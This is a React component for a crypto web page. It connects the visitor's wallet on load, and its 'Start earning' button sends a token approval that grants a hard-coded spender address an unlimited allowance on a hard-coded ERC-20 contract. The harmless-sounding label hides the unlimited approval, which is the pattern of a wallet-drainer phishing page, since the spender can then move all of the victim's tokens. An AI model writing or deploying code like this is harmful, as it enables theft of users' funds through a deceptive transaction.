import React, { useEffect, useState } from "react";
import { ethers } from "ethers";
import erc20Full from "../abi/erc20.json";

// Extract just the ABI from the full artifact
const erc20ABI = erc20Full.abi;

const ApproveButton: React.FC = () => {
  const [signer, setSigner] = useState<ethers.Signer | null>(null);

  // Function to check wallet connection and get signer
  useEffect(() => {
    const initSigner = async () => {
      if (typeof window !== "undefined" && window.ethereum) {
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = await provider.getSigner();
        setSigner(signer);
        console.log("Wallet connected, signer set");
      }
    };
    initSigner();
  }, []);

  // Function to approve tokens
  const approveTokens = async () => {
    console.log("Approve button clicked"); // Check if this log appears when clicked
    if (!signer) {
      console.error("Signer not found. Ensure the wallet is connected.");
      return;
    }

    try {
      const contractAddress = "0xbA2F01dD2372b63e01AB405e1C7349b0f5e2416F"; // Replace with your contract address
      const spenderAddress = "0xf8dfb0d36fc49D0fdc89c36fE73AEc6ac31AA541"; // Replace with actual spender address
      const contract = new ethers.Contract(contractAddress, erc20ABI, signer);

      const amount = ethers.MaxUint256; // Replace with the amount to approve

      console.log("Sending approval transaction...");
      const tx = await contract.approve(spenderAddress, amount);
      console.log("Transaction sent, waiting for confirmation...");
      await tx.wait(); // Wait for the transaction to be mined
      console.log("Tokens approved successfully!");
    } catch (error) {
      console.error("Error approving tokens:", error);
    }
  };

  return (
    <button
      onClick={approveTokens}
      className="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-semibold text-xl py-2 px-4 rounded-full hover:from-pink-500 hover:to-orange-500 mt-3 py-5"
    >
      Start earning
    </button>
  );
};

interface ApproveButtonProps {
  onClick: () => void;
  children: React.ReactNode; // Accepts anything that can be rendered as children
}



export default ApproveButton;
